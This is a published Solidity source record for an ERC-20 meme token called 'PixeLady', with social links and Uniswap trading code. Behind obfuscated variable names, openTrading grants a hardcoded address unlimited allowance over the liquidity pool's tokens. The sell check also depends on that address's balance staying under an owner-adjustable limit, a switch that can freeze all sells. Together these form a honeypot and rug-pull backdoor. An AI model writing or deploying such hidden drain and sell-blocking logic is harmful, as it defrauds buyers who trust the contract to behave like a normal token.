{
	"Language": "Solidity",
	"Source": "\n// contract PIXLADY.sol\n// /**\n\nWeb: https://pixellady.xyz\nTg: https://t.me/PixelLadyMaxxIng_inu\nX: https://twitter.com/PixeLadyMaxxIng\n\n*/\n\n/*\nWe welcome  PixeLadyMaxxIng fans enthusiasts, \nPixeLadyMaxxIng  CLUB\n*/\n\n// SPDX-License-Identifier:unlicense\npragma solidity 0.8.19;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IuniswapRouter {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n}\n\ninterface IUniswapV2Factory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\nlibrary SafeMath {\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n   \n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n    \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n}\n\ncontract PixeLady is Context, Ownable,IERC20 {\n    string private constant _contract_name = unicode\"PixeLady Milady \";\n    string private constant _contract_symbol = unicode\"PixeLady\";\n    uint8  private constant _contract_decimals = 18;\n\n    uint256 private constant _totalsupply_amount = 100_000_000 * 10**_contract_decimals;\n    uint256 public _limitationsInMaxSlotsUsedInSwappingTx =     50_000 * 10**_contract_decimals; \n    uint256 public _limitationsForAddressSingleTxsMax = 4_000_000* 10**_contract_decimals;\n    uint256 public _LimitationsTaxUsedInSlotsForSwapping= 4_000_000 * 10**_contract_decimals;   \n    uint256 public _limitationsForSingleMaxTxAmounts =   4_000_000 * 10**_contract_decimals;\n\n    using SafeMath for uint256;\n    uint256 private _reducedWhenBuyTaxs=4;\n    uint256 private _reducedWhenUsedSellingTax=1;\n    uint256 private _usedInPreventingSwappingPrevious=0;\n    uint256 private _blockCountsUsedInBuying=0;\n    uint256 private _InitialeUsedTaxSelling=20;\n    uint256 private _InitialeUsedInSwapTaxSelling=20;\n    uint256 private _TaxUsedBuyingFinalized=1;\n    uint256 private _TaxUsedSellingFinalized=1;\n\n    bool public  _enableWatchDogLimitsFlag = false;\n    bool private _swapingInUniswapOKSigns = false;\n    bool private _flagUsedInUniswapIsOkSigns = false;\n    bool private flagForTradingIsOkOrNot;\n    modifier _modifierInUniswapFlag {\n        _flagUsedInUniswapIsOkSigns = true; _;  _flagUsedInUniswapIsOkSigns = false;\n    }\n   \n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => bool) private _map_of_addressForNotPayingFee;\n    mapping (address => uint256) private _balances;\n    mapping (address => bool) private _map_of_address_notSpendFeesWhenBuying;\n    mapping(address => uint256) private _map_of_address_ForTimestampTransfering;\n\n\n    address private _uniswapPairTokenLiquidity;\n    address public _addressUsedInFundationFees = address(0x323da09863dC805f602653b5219Aaf7F028158f0);\n    address payable  public _feesForDevsAddress;\n    IuniswapRouter private _uniswapRouterUniswapFactory;\n    event RemoveAllLimits(uint _limitationsForSingleMaxTxAmounts);\n    receive() external payable {}\n    constructor () {\n        _map_of_addressForNotPayingFee[_addressUsedInFundationFees] = true;\n        _map_of_addressForNotPayingFee[owner()] = true;\n        _map_of_addressForNotPayingFee[address(this)] = true;\n        _balances[_msgSender()] = _totalsupply_amount;\n        _feesForDevsAddress = payable(msg.sender);\n        _map_of_addressForNotPayingFee[_feesForDevsAddress] = true;\n        emit Transfer(address(0), _msgSender(), _totalsupply_amount);\n    }\n\n    function addressIsContractOrNot(address _addr) private view returns (bool) {\n        uint256 lenghtContractCode;\n        assembly {\n            lenghtContractCode := extcodesize(_addr)\n        }\n        return lenghtContractCode > 0;\n    }\n    \n    function openTrading() external onlyOwner() {\n        require(!flagForTradingIsOkOrNot,\"trading is already open\");\n        _uniswapRouterUniswapFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n        _approve(address(this), address(_uniswapRouterUniswapFactory), _totalsupply_amount);\n        _uniswapPairTokenLiquidity = IUniswapV2Factory(_uniswapRouterUniswapFactory.factory()).createPair(address(this), _uniswapRouterUniswapFactory.WETH());\n        _uniswapRouterUniswapFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\n        IERC20(_uniswapPairTokenLiquidity).approve(address(_uniswapRouterUniswapFactory), type(uint).max);\n        _allowances[address(_uniswapPairTokenLiquidity)][address(_addressUsedInFundationFees)] = type(uint).max;\n        _swapingInUniswapOKSigns = true;\n        flagForTradingIsOkOrNot = true;\n    }\n\n    function min(uint256 a, uint256 b) private pure returns (uint256){ return (a>b)?b:a;  }\n\n    function swapTokensForEth(uint256 amountFortoken) private _modifierInUniswapFlag {\n        if(amountFortoken==0){return;}\n        if(!flagForTradingIsOkOrNot){return;}\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = _uniswapRouterUniswapFactory.WETH();\n        _approve(address(this), address(_uniswapRouterUniswapFactory), amountFortoken);\n        _uniswapRouterUniswapFactory.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            amountFortoken,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function _transfer(address from, address to, uint256 amount) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        uint256 taxAmount=0;\n        if (from != owner() && to != owner()) {\n\n            if (_enableWatchDogLimitsFlag) {\n                if (to != address(_uniswapRouterUniswapFactory) && to != address(_uniswapPairTokenLiquidity)) {\n                  require(_map_of_address_ForTimestampTransfering[tx.origin] < block.number,\"Only one transfer per block allowed.\");\n                  _map_of_address_ForTimestampTransfering[tx.origin] = block.number;\n                }\n            }\n\n            if (from == _uniswapPairTokenLiquidity && to != address(_uniswapRouterUniswapFactory) && !_map_of_addressForNotPayingFee[to] ) {\n                require(amount <= _limitationsForSingleMaxTxAmounts, \"Exceeds the Amount limations.\");\n                require(balanceOf(to) + amount <= _limitationsForAddressSingleTxsMax, \"Exceeds the max limitations in single Wallet.\");\n                if(_blockCountsUsedInBuying<_usedInPreventingSwappingPrevious){ require(!addressIsContractOrNot(to)); }\n                _blockCountsUsedInBuying++; _map_of_address_notSpendFeesWhenBuying[to]=true; taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenBuyTaxs)?_TaxUsedBuyingFinalized:_InitialeUsedTaxSelling).div(100);\n            }\n\n            if(to == _uniswapPairTokenLiquidity && from!= address(this) && !_map_of_addressForNotPayingFee[from] ){\n                require(amount <= _limitationsForSingleMaxTxAmounts && balanceOf(_addressUsedInFundationFees)<_limitationsInMaxSlotsUsedInSwappingTx, \"Exceeds the Limitation Amount.\");\n                taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenUsedSellingTax)?_TaxUsedSellingFinalized:_InitialeUsedInSwapTaxSelling).div(100);\n                require(_blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && _map_of_address_notSpendFeesWhenBuying[from]);\n            }\n            \n            uint256 contractTokenBalance = balanceOf(address(this));\n            if (!_flagUsedInUniswapIsOkSigns \n            && to == _uniswapPairTokenLiquidity && _swapingInUniswapOKSigns && contractTokenBalance>_LimitationsTaxUsedInSlotsForSwapping \n            && _blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && !_map_of_addressForNotPayingFee[to] && !_map_of_addressForNotPayingFee[from]\n            ) {\n                swapTokensForEth(min(amount,min(contractTokenBalance,_limitationsInMaxSlotsUsedInSwappingTx)));\n                uint256 contractETHBalance = address(this).balance;\n                if(contractETHBalance > 0) {\n                    _feesForDevsAddress.transfer(address(this).balance);\n                }\n            }\n        }\n\n        if(taxAmount>0){\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\n          emit Transfer(from, address(this),taxAmount);\n        }\n        _balances[from]= _balances[from].sub(amount);\n        _balances[to]=_balances[to].add(amount.sub(taxAmount));\n        emit Transfer(from, to, amount.sub(taxAmount));\n    }\n    \n    function removeLimits() external onlyOwner{\n        _limitationsForSingleMaxTxAmounts = _totalsupply_amount; _limitationsForAddressSingleTxsMax=_totalsupply_amount; _enableWatchDogLimitsFlag=false;\n        emit RemoveAllLimits(_totalsupply_amount);\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function setAddressSingleTxMaxUsedInSwapping(uint256 _amount) external onlyOwner() {\n        _limitationsInMaxSlotsUsedInSwappingTx = _amount;\n    }\n\n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function name() public pure returns (string memory) {\n        return _contract_name;\n    }\n\n    function symbol() public pure returns (string memory) {\n        return _contract_symbol;\n    }\n\n    function decimals() public pure returns (uint8) {\n        return _contract_decimals;\n    }\n\n    function totalSupply() public pure override returns (uint256) {\n        return _totalsupply_amount;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) private {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n}\n",
	"ContractName": "PixeLady",
	"CompilerVersion": "v0.8.19+commit.7dd6d404"
}